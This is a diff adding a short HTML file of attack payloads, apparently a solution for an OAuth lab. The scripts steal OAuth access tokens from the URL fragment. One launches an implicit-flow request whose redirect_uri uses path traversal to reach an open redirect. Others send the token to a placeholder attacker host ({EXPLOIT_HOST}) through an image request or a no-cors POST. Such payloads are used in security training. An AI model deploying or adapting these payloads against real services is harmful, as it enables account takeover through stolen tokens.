@@ -1,0 +1,23 @@
+<!-- Minimal fragment to query param (logs in access log) -->
+<script>location='/?'+location.hash.slice(1)</script>
+
+<!-- One-click flow: start OAuth if no token, otherwise exfil -->
+<script>
+if (!location.hash) {
+  location = 'https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri='
+    + encodeURIComponent('https://{LAB_HOST}/oauth-callback/../post/next?path=https://{EXPLOIT_HOST}/exploit')
+    + '&response_type=token&nonce={RAND}&scope=openid%20profile%20email';
+} else {
+  location = '/?'+location.hash.slice(1);
+}
+</script>
+
+<!-- Image-based exfil to avoid mixed-content/fetch issues -->
+<script>
+new Image().src = 'https://{EXPLOIT_HOST}/?'+location.hash.slice(1);
+</script>
+
+<!-- Post token to same-origin endpoint (if running your own receiver) -->
+<script>
+fetch('/log', {method:'POST',mode:'no-cors',body:location.hash.slice(1)});
+</script>
